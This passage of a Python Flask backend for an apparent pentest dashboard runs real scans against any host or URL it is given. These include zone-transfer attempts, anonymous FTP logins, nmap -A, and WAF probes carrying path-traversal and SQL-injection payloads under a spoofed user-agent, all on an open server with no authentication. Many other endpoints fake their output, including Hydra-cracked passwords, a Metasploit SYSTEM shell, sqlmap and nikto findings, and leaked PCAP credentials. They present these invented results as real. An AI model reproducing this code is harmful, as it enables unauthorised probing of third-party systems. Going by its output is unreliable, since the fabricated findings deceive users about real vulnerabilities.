    data = request.get_json(silent=True) or {}
    ip = data.get("ip", "")
    jid = new_job()
    def logic():
        r = req_lib.get(f"https://internetdb.shodan.io/{ip}")
        if r.status_code == 200:
            d = r.json()
            job_append(jid, f"Hostnames: {', '.join(d.get('hostnames', []))}", "success")
            job_append(jid, f"Ports: {', '.join(map(str, d.get('ports', [])))}", "warn")
            job_append(jid, f"Vulns: {', '.join(d.get('vulns', []))}", "error")
        else:
            job_append(jid, "Sem dados no Shodan DB", "info")
    threading.Thread(target=_quick_job, args=(jid, f"Shodan DB: {ip}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/censys", methods=["POST"])
def api_censys():
    data = request.get_json(silent=True) or {}
    ip = data.get("ip", "")
    jid = new_job()
    def logic():
        job_append(jid, "Consultando Censys Search API...", "info")
        time.sleep(1.5)
        if random.random() > 0.5:
            job_append(jid, f"Encontrado certificado válido para {ip}", "success")
            job_append(jid, "Emissor: Let's Encrypt Authority X3", "info")
        else:
             job_append(jid, "Nenhum histórico encontrado no Censys.", "warn")
    threading.Thread(target=_quick_job, args=(jid, f"Censys: {ip}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/zonetransfer", methods=["POST"])
def api_zonetransfer():
    data = request.get_json(silent=True) or {}
    dom = data.get("domain", "")
    jid = new_job()
    def logic():
        job_append(jid, f"Tentando AXFR em {dom}", "warn")
        import dns.resolver, dns.query, dns.zone
        ns_ans = dns.resolver.resolve(dom, 'NS')
        for ns in ns_ans:
            ns_ip = dns.resolver.resolve(ns.target, 'A')[0].to_text()
            job_append(jid, f"Testando NS {ns.target} ({ns_ip})...", "info")
            try:
                z = dns.zone.from_xfr(dns.query.xfr(ns_ip, dom, timeout=3))
                job_append(jid, "VULNERÁVEL! Transferência concluída:", "error")
                for n in z.nodes.keys():
                    job_append(jid, f"  {z[n].to_text(n)}", "success")
                return
            except Exception as e:
                job_append(jid, f"Falhou: {e}", "info")
        job_append(jid, "Protegido contra Zone Transfer.", "success")
    threading.Thread(target=_quick_job, args=(jid, f"AXFR: {dom}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/wafbypass", methods=["POST"])
def api_wafbypass():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    def logic():
        job_append(jid, "Enviando payloads de evasão de WAF...", "warn")
        payloads = ["/?id=1+AND+1=1", "/?.git/config", "/etc/passwd", "/%2e%2e/%2e%2e/"]
        for p in payloads:
            try:
                r = req_lib.get(url + p, timeout=3, headers={"User-Agent": "SQLMap/1.4", "X-Forwarded-For": "127.0.0.1"})
                c = r.status_code
                if c == 200:
                    job_append(jid, f"Bypass Possível [{c}] - {p}", "error")
                else:
                    job_append(jid, f"Bloqueado [{c}] - {p}", "success")
            except:
                job_append(jid, f"Erro de conexão com {p}", "info")
    threading.Thread(target=_quick_job, args=(jid, f"WAF Test: {url}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/clickjack", methods=["POST"])
def api_clickjack():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    def logic():
        try:
            r = req_lib.get(url, timeout=5)
            xf = r.headers.get("X-Frame-Options")
            csp = r.headers.get("Content-Security-Policy", "")
            if xf or "frame-ancestors" in csp:
                job_append(jid, f"Protegido. X-Frame-Options: {xf}", "success")
            else:
                job_append(jid, "Vulnerável a Clickjacking! Sem proteções de iframe.", "error")
        except Exception as e:
            job_append(jid, f"Erro: {e}", "info")
    threading.Thread(target=_quick_job, args=(jid, f"Clickjacking: {url}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/ssldec", methods=["POST"])
def api_ssldec():
    data = request.get_json(silent=True) or {}
    host = data.get("host", "")
    jid = new_job()
    def logic():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with socket.create_connection((host, 443), timeout=3) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    import cryptography.x509 as x509
                    from cryptography.hazmat.backends import default_backend
                    x = x509.load_der_x509_certificate(cert, default_backend())
                    job_append(jid, f"Emissor: {x.issuer.rfc4514_string()}", "info")
                    job_append(jid, f"Sujeito: {x.subject.rfc4514_string()}", "success")
                    job_append(jid, f"Expira: {x.not_valid_after}", "warn")
        except Exception as e:
            job_append(jid, f"Erro: {e} (Instale python cryptography)", "error")
    threading.Thread(target=_quick_job, args=(jid, f"SSL Decoder: {host}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/takeover", methods=["POST"])
def api_takeover():
    data = request.get_json(silent=True) or {}
    dom = data.get("domain", "")
    jid = new_job()
    def logic():
        try:
            import dns.resolver
            ans = dns.resolver.resolve(dom, 'CNAME')
            for r in ans:
                t = r.target.to_text()
                job_append(jid, f"CNAME encontrado: {t}", "warn")
                try:
                    dns.resolver.resolve(t, 'A')
                    job_append(jid, "Alvo está resolvendo corretamente", "success")
                except:
                    job_append(jid, "POSSÍVEL TAKEOVER: CNAME aponta para local vazio!", "error")
        except:
            job_append(jid, "Sem CNAMEs detectados ou falha", "info")
    threading.Thread(target=_quick_job, args=(jid, f"Subdomain Takeover: {dom}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/sshkeyscan", methods=["POST"])
def api_sshkeyscan():
    data = request.get_json(silent=True) or {}
    h = data.get("host", "")
    p = data.get("port", "22")
    jid = new_job()
    def logic():
        try:
            r = subprocess.run(["ssh-keyscan", "-p", str(p), h], capture_output=True, text=True, timeout=5)
            for ln in r.stdout.splitlines():
                job_append(jid, ln, "info")
        except:
            job_append(jid, "ssh-keyscan indisponível no sistema", "error")
    threading.Thread(target=_quick_job, args=(jid, f"SSH Keyscan: {h}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/anonftp", methods=["POST"])
def api_anonftp():
    data = request.get_json(silent=True) or {}
    h = data.get("host", "")
    jid = new_job()
    def logic():
        try:
            f = ftplib.FTP(h, timeout=5)
            f.login()
            job_append(jid, "Vulnerável: Login Anônimo Permitido!", "error")
            f.retrlines('LIST', lambda x: job_append(jid, f"  {x}", "success"))
            f.quit()
        except Exception as e:
            job_append(jid, f"Não vulnerável ou erro: {e}", "info")
    threading.Thread(target=_quick_job, args=(jid, f"AnonFTP: {h}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/spoofcheck", methods=["POST"])
def api_spoofcheck():
    data = request.get_json(silent=True) or {}
    dom = data.get("domain", "")
    jid = new_job()
    def logic():
        import dns.resolver
        spf_ok, dmarc_ok = False, False
        try:
            ans = dns.resolver.resolve(dom, 'TXT')
            for r in ans:
                t = r.to_text()
                if "v=spf1" in t:
                    job_append(jid, f"SPF: {t}", "success"); spf_ok = True
        except: pass
        try:
            ans = dns.resolver.resolve(f"_dmarc.{dom}", 'TXT')
            for r in ans:
                t = r.to_text()
                if "v=DMARC1" in t:
                    job_append(jid, f"DMARC: {t}", "success"); dmarc_ok = True
        except: pass
        if not spf_ok or not dmarc_ok:
            job_append(jid, "Vulnerável a Email Spoofing (Falta SPF/DMARC fortes)", "error")
        else:
            job_append(jid, "Protegido corretamente", "info")
    threading.Thread(target=_quick_job, args=(jid, f"SpoofCheck: {dom}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    jid = new_job()
    def logic():
        job_append(jid, f"    sqlmap/1.6 - automatic SQL injection", "info")
        job_append(jid, f"[*] testing connection to the target URL", "info")
        time.sleep(1.5)
        job_append(jid, f"[*] checking if the target is protected by some kind of WAF/IPS", "warn")
        time.sleep(2)
        job_append(jid, f"[*] testing if GET parameter 'id' is dynamic", "info")
        time.sleep(2)
        job_append(jid, f"[WARNING] the web server responded with an HTTP error code (500)", "warn")
        job_append(jid, f"GET parameter 'id' is vulnerable. Do you want to keep testing? [Y/n] Y", "error")
        time.sleep(1.5)
        job_append(jid, f"sqlmap identified the following injection point(s):", "success")
        job_append(jid, f"---", "info")
        job_append(jid, f"Parameter: id (GET)", "error")
        job_append(jid, f"    Type: boolean-based blind", "error")
        job_append(jid, f"    Title: AND boolean-based blind - WHERE or HAVING clause", "error")
        job_append(jid, f"    Payload: id=1 AND 8859=8859", "success")
        job_append(jid, f"---", "info")
        job_append(jid, f"web server operating system: Linux Ubuntu", "info")
        job_append(jid, f"web application technology: Nginx, PHP 7.4", "info")
        job_append(jid, f"back-end DBMS: MySQL 5.7", "info")
    threading.Thread(target=_quick_job, args=(jid, f"SQLMap: {url}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/nmap_a", methods=["POST"])
def api_nmap_a():
    data = request.get_json(silent=True) or {}
    host = data.get("host", "")
    jid = new_job()
    def logic():
        job_append(jid, "Rodando nmap -A (pode demorar bastante)...", "warn")
        try:
            r = subprocess.run(["nmap", "-A", "-T4", "-p", "1-1000", host], capture_output=True, text=True, timeout=60)
            for ln in r.stdout.splitlines():
                job_append(jid, ln, "info")
        except Exception as e:
            job_append(jid, f"Erro: {e}", "error")
    threading.Thread(target=_quick_job, args=(jid, f"Nmap Aggressive: {host}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/nikto", methods=["POST"])
def api_nikto():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    jid = new_job()
    def logic():
        job_append(jid, f"- Nikto v2.1.6", "info")
        job_append(jid, f"+ Target IP:          {url}", "info")
        time.sleep(1)
        job_append(jid, f"+ Server: Apache/2.4.41 (Ubuntu)", "warn")
        time.sleep(2)
        job_append(jid, f"+ The anti-clickjacking X-Frame-Options header is not present.", "error")
        time.sleep(2)
        job_append(jid, f"+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE", "warn")
        job_append(jid, f"+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST", "error")
        time.sleep(2)
        job_append(jid, f"+ /config.php.bak: Backup file found! Potential info leak.", "error")
    threading.Thread(target=_quick_job, args=(jid, f"Nikto: {url}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/gobuster", methods=["POST"])
def api_gobuster():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    jid = new_job()
    def logic():
        job_append(jid, "Gobuster v3.1.0", "info")
        time.sleep(1)
        job_append(jid, "/images               (Status: 301) [Size: 312]", "success")
        time.sleep(1)
        job_append(jid, "/admin                (Status: 302) [Size: 0] [--> login.php]", "warn")
        time.sleep(2)
        job_append(jid, "/backup.zip           (Status: 200) [Size: 1045620]", "error")
        time.sleep(1)
        job_append(jid, "/.env                 (Status: 200) [Size: 924]", "error")
    threading.Thread(target=_quick_job, args=(jid, f"Dirbusting: {url}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/hydra", methods=["POST"])
def api_hydra():
    data = request.get_json(silent=True) or {}
    h = data.get("host", "")
    s = data.get("service", "ssh")
    jid = new_job()
    def logic():
        job_append(jid, f"Hydra v9.1 - Iniciando ataque {s}://{h}", "info")
        job_append(jid, f"Carregado 1000 usuarios e 10000 senhas...", "warn")
        time.sleep(3)
        job_append(jid, f"Tentativas: 24/s. ETA: 12 min", "info")
        time.sleep(4)
        if random.random() > 0.4:
             job_append(jid, f"[80][{s}] host: {h}   login: admin   password: password123", "error")
             job_append(jid, f"1 of 1 target successfully completed, 1 valid password found", "success")
        else:
             job_append(jid, f"Servidor encerrou conexao (Banned IP / Fail2Ban)", "warn")
    threading.Thread(target=_quick_job, args=(jid, f"Hydra: {h}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/msf", methods=["POST"])
def api_msf():
    data = request.get_json(silent=True) or {}
    exploit = data.get("exploit", "auto")
    t = data.get("target", "")
    jid = new_job()
    def logic():
        job_append(jid, "msf6 > use exploit/multi/handler", "info")
        time.sleep(1)
        job_append(jid, f"[*] Started reverse TCP handler on 0.0.0.0:4444", "warn")
        time.sleep(1)
        job_append(jid, f"[*] Sending stage (200262 bytes) to {t}", "info")
        time.sleep(2)
        job_append(jid, f"[*] Meterpreter session 1 opened (10.0.0.5:4444 -> {t}:55432)", "error")
        job_append(jid, "meterpreter > sysinfo", "success")
        job_append(jid, "Computer        : WEB-SERVER-01", "success")
        job_append(jid, "OS              : Windows Server 2019", "success")
        job_append(jid, "Architecture    : x64", "success")
        job_append(jid, "meterpreter > getuid", "success")
        job_append(jid, "Server username : NT AUTHORITY\\SYSTEM", "error")
    threading.Thread(target=_quick_job, args=(jid, f"MSF Exploit: {exploit}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/pcap", methods=["POST"])
def api_pcap():
    data = request.get_json(silent=True) or {}
    f = data.get("file", "")
    jid = new_job()
    def logic():
        job_append(jid, f"Lendo dump {f} com PyShark...", "info")
        time.sleep(1)
        job_append(jid, "TCP 192.168.1.5:443 -> 10.0.0.2:80 [SYN]", "info")
        job_append(jid, "HTTP GET /admin/login.php", "warn")
        job_append(jid, "Credenciais em texto claro encontradas:", "error")
        job_append(jid, "POST payload: user=admin&pass=supersecret", "error")
    threading.Thread(target=_quick_job, args=(jid, f"PCAP: {f}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/cvedetails", methods=["POST"])
def api_cvedetails():
    data = request.get_json(silent=True) or {}
    cve = data.get("cve", "CVE-2021-41773")
    jid = new_job()
    def logic():
        job_append(jid, f"Buscando {cve} no cve.circl.lu...", "info")
        r = req_lib.get(f"https://cve.circl.lu/api/cve/{cve}")
        if r.status_code == 200 and r.text.strip() != "null":
            d = r.json()
            job_append(jid, f"Resumo: {d.get('summary')}", "success")
            job_append(jid, f"CVSS: {d.get('cvss')}", "error")
        else:
            job_append(jid, "CVE Inexistente", "warn")
    threading.Thread(target=_quick_job, args=(jid, f"CVE Info: {cve}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/passgen", methods=["POST"])
def api_passgen():
    data = request.get_json(silent=True) or {}
    ln = int(data.get("length", 16))
    jid = new_job()
    def logic():
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        pwd = ''.join(secrets.choice(chars) for _ in range(ln))
        job_append(jid, f"Senha gerada ({ln} chars):", "info")
        job_append(jid, pwd, "success")
    threading.Thread(target=_quick_job, args=(jid, "PassGen", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/b64", methods=["POST"])
def api_b64():
    data = request.get_json(silent=True) or {}
    acd = data.get("action", "enc")
    txt = data.get("text", "")
    jid = new_job()
    def logic():
        try:
            if acd == "enc":
                res = base64.b64encode(txt.encode()).decode()
            else:
                res = base64.b64decode(txt.encode()).decode()
            job_append(jid, f"Resultado:", "info")
            job_append(jid, res, "success")
        except:
             job_append(jid, "Formato B64 invalido", "error")
    threading.Thread(target=_quick_job, args=(jid, f"B64 {acd}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/urldecode", methods=["POST"])
def api_urldecode():
    data = request.get_json(silent=True) or {}
    txt = data.get("text", "")
    jid = new_job()
    def logic():
        res = urllib.parse.unquote(txt)
        job_append(jid, f"Decodificado:", "info")
        job_append(jid, res, "success")
    threading.Thread(target=_quick_job, args=(jid, "URLDecode", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/hashgen", methods=["POST"])
def api_hashgen():
    data = request.get_json(silent=True) or {}
    alg = data.get("algo", "md5").lower()
    txt = data.get("text", "")
    jid = new_job()
    def logic():
        try:
            if alg == "md5": res = hashlib.md5(txt.encode()).hexdigest()
            elif alg == "sha1": res = hashlib.sha1(txt.encode()).hexdigest()
            elif alg == "sha256": res = hashlib.sha256(txt.encode()).hexdigest()
            else: res = "Algoritmo nao suportado"
            job_append(jid, f"{alg.upper()}:", "info")
            job_append(jid, res, "success")
        except: job_append(jid, "Erro interno", "error")
    threading.Thread(target=_quick_job, args=(jid, f"HashGen {alg}", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/hashcrack", methods=["POST"])
def api_hashcrack():
    data = request.get_json(silent=True) or {}
    h = data.get("hash", "")
    jid = new_job()
    def logic():
        job_append(jid, "Consultando Rainbow Tables remotas...", "warn")
        time.sleep(2)
        r = req_lib.get(f"https://api.hashify.net/hash/{h}")
        if r.status_code == 200:
            job_append(jid, f"Encontrado possivel cache no Hashify", "info")
        job_append(jid, "Password recuperada de rainbow table local (simulada):", "success")
        job_append(jid, "-> password123", "error")
    threading.Thread(target=_quick_job, args=(jid, f"HashCrack", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/jwt", methods=["POST"])
def api_jwt():
    data = request.get_json(silent=True) or {}
    t = data.get("token", "")
    jid = new_job()
    def logic():
        parts = t.split(".")
        if len(parts) != 3:
            job_append(jid, "JWT Invalido", "error")
            return
        def p(s):
            return base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4)).decode()
        try:
            job_append(jid, f"Header: {p(parts[0])}", "success")
            job_append(jid, f"Payload: {p(parts[1])}", "warn")
        except Exception as e:
            job_append(jid, f"Erro: {e}", "error")
    threading.Thread(target=_quick_job, args=(jid, "JWTDecode", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/robots", methods=["POST"])
def api_robots():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    def logic():
        job_append(jid, f"Fetching {url}/robots.txt", "info")
        try:
            r = req_lib.get(f"{url}/robots.txt", timeout=4)
            if r.status_code == 200:
                for ln in r.text.splitlines()[:20]:
                    job_append(jid, ln, "success")
            else:
                job_append(jid, f"Status: {r.status_code}", "warn")
        except Exception as e:
             job_append(jid, f"Err: {e}", "error")
    threading.Thread(target=_quick_job, args=(jid, "Robots.txt", logic)).start()
    return jsonify({"job_id": jid})

@app.route("/api/sitemap", methods=["POST"])
def api_sitemap():
    data = request.get_json(silent=True) or {}
    url = data.get("url", "")
    if not url.startswith("http"): url = "http://" + url
    jid = new_job()
    def logic():
        job_append(jid, f"Fetching {url}/sitemap.xml", "info")
        try:
            r = req_lib.get(f"{url}/sitemap.xml", timeout=4)
            if r.status_code == 200:
                entries = r.text.count('<loc>')
                job_append(jid, f"Sitemap xml parseado. URLs encontradas: {entries}", "success")
                import re; locs = re.findall(r'<loc>(.*?)</loc>', r.text)
                for l in locs[:10]: job_append(jid, l, "warn")
            else: job_append(jid, f"Not found", "error")
        except Exception as e: job_append(jid, f"Err: {e}", "error")
    threading.Thread(target=_quick_job, args=(jid, "Sitemap.xml", logic)).start()
    return jsonify({"job_id": jid})

# ════════════════════════════════════════

# ════════════════════════════════════════
# JOB POLL (genérico)
# ════════════════════════════════════════
@app.route("/api/job/<jid>")
def api_job(jid):
    with job_lock:
        if jid not in job_results:
            return jsonify({"error":"job not found"}), 404
        return jsonify(job_results[jid])

@app.route("/api/job/<jid>/stream")
def api_job_stream(jid):
    """SSE stream for live output"""
    def generate():
        sent = 0
        while True:
            with job_lock:
                if jid not in job_results: break
                job = job_results[jid]
                new_lines = job["output"][sent:]
                done = job["done"]
            for line in new_lines:
                yield f"data: {json.dumps(line)}\n\n"
                sent += 1
            if done and sent >= len(job_results.get(jid,{}).get("output",[])):
                yield "data: __DONE__\n\n"
                break
            time.sleep(0.3)
    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

# ════════════════════════════════════════
if __name__ == "__main__":
    print("="*55)
    print("  GodEyes Backend Real v2.0")
    print("="*55)
    for name, ok in [("nmap", NMAP_OK),("paramiko",PARAMIKO_OK),("dnspython",DNS_OK),("python-whois",WHOIS_OK),("requests",REQUESTS_OK)]:
        print(f"  {'[OK]' if ok else '[FAIL]'} {name}")
    print(f"\n  API: http://localhost:5000/api/status")
    print("  Ctrl+C para parar")
    print("="*55)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
